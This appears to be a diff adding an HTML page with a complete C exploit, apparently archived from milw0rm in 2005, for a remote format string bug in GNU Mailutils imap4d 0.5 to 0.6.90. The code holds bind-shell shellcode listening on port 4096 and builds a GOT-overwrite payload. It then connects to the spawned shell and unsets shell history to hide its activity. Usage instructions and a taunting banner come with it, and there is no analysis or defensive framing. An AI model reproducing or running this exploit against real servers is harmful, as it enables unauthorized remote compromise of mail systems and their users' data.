@@ -1,0 +1,297 @@
+<html><head><title>GNU Mailutils imap4d 0.5 < 0.6.90 Remote Format String Exploit</title></head><pre>/*
+   gun-imapd.c
+   &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+
+   gnu mailutils-0.5 - &lt; mailutils-0.6.90 remote formatstring exploit
+  
+   written and tested on FC3.
+   this is a first testing version and the onlyone to go public.
+   
+
+   by
+      qobaiashi@u-n-f.com
+
+*/
+
+
+
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+
+// to be modified
+#define  GOT  0x080573fc 
+
+static char bindshell[]= //by pr1 bind to :4096 
+&quot;\x31\xc0&quot;              //  xor    %eax,%eax
+&quot;\x50&quot;                  //  push  %eax
+&quot;\x40&quot;                  //  inc    %eax
+&quot;\x89\xc3&quot;              //  mov    %eax,%ebx
+&quot;\x40&quot;                  //  inc    %eax
+&quot;\x53&quot;                  //  push  %ebx
+&quot;\x50&quot;                          //  push  %eax
+&quot;\x89\xe1&quot;                      //  mov    %esp,%ecx
+&quot;\xb0\x66&quot;                      //  mov    $0x66,%al
+&quot;\xcd\x80&quot;              //  int    $0x80
+&quot;\x31\xd2&quot;              //  xor    %edx,%edx
+&quot;\x52&quot;                  //  push  %edx
+&quot;\x43&quot;                  //  inc    %ebx
+&quot;\x6a\x10&quot;              //  push  $0x10
+&quot;\x66\x53&quot;              //  push  %bx
+&quot;\x89\xe1&quot;                      //  mov    %esp,%ecx
+&quot;\x6a\x10&quot;              //  push  $0x10
+&quot;\x51&quot;                  //  push  %ecx
+&quot;\x50&quot;                  //  push  %eax
+&quot;\x89\xe1&quot;              //  mov    %esp,%ecx
+&quot;\xb0\x66&quot;                      //  mov    $0x66,%al
+&quot;\xcd\x80&quot;              //  int    $0x80
+&quot;\xd1\xe3&quot;              //  shl    %ebx
+&quot;\xb0\x66&quot;              //  mov    $0x66,%al
+&quot;\xcd\x80&quot;              //  int    $0x80
+&quot;\x58&quot;                  //  pop    %eax
+&quot;\x52&quot;                          //  push  %edx
+&quot;\x50&quot;                          //  push  %eax
+&quot;\x43&quot;                          //  inc    %ebx
+&quot;\x89\xe1&quot;              //  mov    %esp,%ecx
+&quot;\xb0\x66&quot;              //  mov    $0x66,%al
+&quot;\xcd\x80&quot;              //  int    $0x80
+&quot;\x87\xd9&quot;                      //  xchg  %ebx,%ecx
+&quot;\x93&quot;                          //  xchg  %eax,%ebx
+&quot;\x49&quot;                          //  dec    %ecx
+&quot;\x31\xc0&quot;                      //  xor    %eax,%eax
+&quot;\x49&quot;                          //  dec    %ecx
+&quot;\xb0\x3f&quot;                      //  mov    $0x3f,%al
+&quot;\xcd\x80&quot;                      //  int    $0x80
+&quot;\x41&quot;                          //  inc    %ecx
+&quot;\xe2\xf8&quot;                      //  loop  8048469 &lt;blah&gt;
+&quot;\x52&quot;                          //  push  %edx
+&quot;\x68\x6e\x2f\x73\x68&quot;    //  push  $0x68732f6e
+&quot;\x68\x2f\x2f\x62\x69&quot;    //  push  $0x69622f2f
+&quot;\x89\xe3&quot;                //  mov    %esp,%ebx
+&quot;\x52&quot;                    //  push  %edx
+&quot;\x53&quot;                    //  push  %ebx
+&quot;\x89\xe1&quot;                //  mov    %esp,%ecx
+&quot;\xb0\x0b&quot;                //  mov    $0xb,%al
+&quot;\xcd\x80&quot;                //  int    $0x80
+;
+
+
+/********************************\
+|****** handle remoteshell ******|
+\********************************/
+
+int handleshell(int peersh)
+{
+fd_set fds;
+char buff[2048];
+int ret, cntr = 1;
+
+printf(&quot; |- enjoy your stay and come back soon ;&gt;\n&quot;);
+
+write(peersh, &quot;unset HISTFILE;id;uname -a;\n&quot;, 30);
+
+while(ret &amp;&amp; cntr)
+     {
+      FD_ZERO(&amp;fds);
+      FD_SET(0, &amp;fds);
+      FD_SET(peersh, &amp;fds);
+      ret = select(peersh+1, &amp;fds, 0, 0, 0);
+      if(ret) 
+        {
+         memset(buff, 0x0, sizeof(buff));
+         if(FD_ISSET(peersh, &amp;fds)) 
+           {
+            cntr = read(peersh, buff, sizeof(buff)-1); 
+            printf(&quot;%s&quot;, buff);
+            fflush(stdout);
+            }
+         if(FD_ISSET(0, &amp;fds)) 
+           {
+            cntr = read(0, buff, sizeof(buff)-1);
+            write(peersh, buff, strlen(buff));
+           }
+        }
+     }  
+ return 1;
+}
+
+
+
+
+
+/********************************\
+|********* HELP OUTPUT **********|
+\********************************/
+
+void help()
+{
+
+printf(&quot; `- usage: gun-imapd -p 143 -t www.exploits.cx  \n&quot;);                
+exit(0);
+}
+
+
+
+/********************************\
+|******* CONNECT FUNC  **********|
+\********************************/
+
+
+int connectme(char* ip, unsigned short port)
+{
+int soquet;
+struct sockaddr_in  remoteaddr_in;
+struct hostent*     hostip;
+
+memset(&amp;remoteaddr_in, 0x0, sizeof(remoteaddr_in));
+if ((hostip = gethostbyname(ip)) == NULL)
+   {
+     printf(&quot; |- could not resolve [%s]\n&quot;, ip);
+     exit(-1);
+   }
+
+remoteaddr_in.sin_family = AF_INET;
+remoteaddr_in.sin_port   = htons(port);
+remoteaddr_in.sin_addr   = *((struct in_addr *)hostip-&gt;h_addr);
+
+if ((soquet = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0)
+    {
+     printf(&quot; |- got no socket!\n&quot;);
+     exit(-1);
+    }
+
+printf(&quot; |- try connecting to [%s:%d] ...&quot;, ip, port);
+
+if (connect(soquet, (struct sockaddr *)&amp;remoteaddr_in, sizeof(struct sockaddr)) ==  -1)
+   {
+    printf(&quot; no connection, exiting!\n&quot;);
+    exit(-1);
+   }
+
+printf(&quot; successfull!\n&quot;);
+return(soquet);
+}
+
+
+/********************************\
+|********* DO SPLOIT ************|
+\********************************/
+
+int do_sploit(int soquet)
+{
+char buff[1024], *addr = 0;
+int cntr = 0, *ptr, scaddr, gotaddr = GOT;
+unsigned int w1, w2 ,w3;
+
+//find heap with our shellcode: !experimental!
+memset(buff, 0x00, sizeof(buff));
+memset(buff, 0x41, 496);
+strcat(buff, &quot;111122223333%p%p%p%p[%p-%p]\r\n&quot;);
+
+if(write(soquet, buff, strlen(buff)) == -1)
+  {
+   printf(&quot; |- could not send packet!\n&quot;);
+   return -1;
+  }
+memset(buff, 0x00, sizeof(buff));
+read(soquet, buff, sizeof(buff)-1);
+addr = strstr(buff, &quot;[&quot;);
+if(addr &gt; 0) 
+  { 
+   scaddr = strtoul(++addr, 0, 0) + 0x330;//the next chunk..
+   printf(&quot; |- using %p\n&quot;, scaddr);
+     } 
+else printf(&quot; |- !could not determine heap address..\n!&quot;); 
+//k build exploit now:
+
+ w3 = ( scaddr &amp; 0xffff0000 ) &gt;&gt; 16;
+ w1 = ( scaddr &amp; 0x0000ffff );
+
+
+memset(buff, 0x00, sizeof(buff));
+memset(buff, 0x41, 496);
+memcpy(buff+400, bindshell, strlen(bindshell));
+cntr = strlen(buff) + 3*4;
+
+
+ptr = (int *)gotaddr;
+memcpy((buff+496), &amp;ptr,4);
+ptr = (int *)gotaddr;
+memcpy((buff+500), &amp;ptr,4);
+ptr = (int *)(gotaddr+2);
+memcpy((buff+504), &amp;ptr,4);
+w1 -= cntr; 
+w3 += (0x10000 - w1) - cntr;
+sprintf(buff+508, &quot;%%%dp%%n%%%dp%%n \r\n&quot;, w1, w3);
+
+if(write(soquet, buff, strlen(buff)) == -1)
+  {
+   printf(&quot; |- could not send packet!\n&quot;);
+   return -1;
+  }
+//memset(buff, 0x00, sizeof(buff));
+//read(soquet, buff, sizeof(buff));
+
+
+return 1;
+}
+
+/********************************\
+|************* MAIN *************|
+\********************************/
+
+int main(int argc, char *argv[])
+{
+int tmp, socke, port = 143;
+char *target = 0;
+char banner[32];
+
+printf(&quot; . gun-imapd v0.1 by qobaiashi\n |\n&quot;);
+memset(banner, 0x00, sizeof(banner));
+
+while((tmp = getopt(argc, argv, &quot;p:t:h&quot;)) != EOF)
+     {
+      switch (tmp)
+             { 
+              case 'p':  
+                         port = atoi(optarg);
+                         printf(&quot; |- using port: %d\n&quot;, port);
+                         break;
+
+              case 't':  
+                         target = optarg;
+                         printf(&quot; |- target host is: %s\n&quot;, optarg);
+                         break;
+
+              case 'h':  help();
+              }      
+
+      }
+if (target == NULL) help();
+socke = connectme(target, port);
+
+if (read(socke, banner, sizeof(banner)) &gt; -1)
+   {
+    printf(&quot; |- remote host is a %s&quot;, (banner+4));
+   } 
+
+do_sploit(socke);
+sleep(1);
+tmp = connectme(target, 4096);
+handleshell(tmp);
+
+close(tmp);
+close(socke);
+}
+
+// milw0rm.com [2005-06-10]</pre></html>
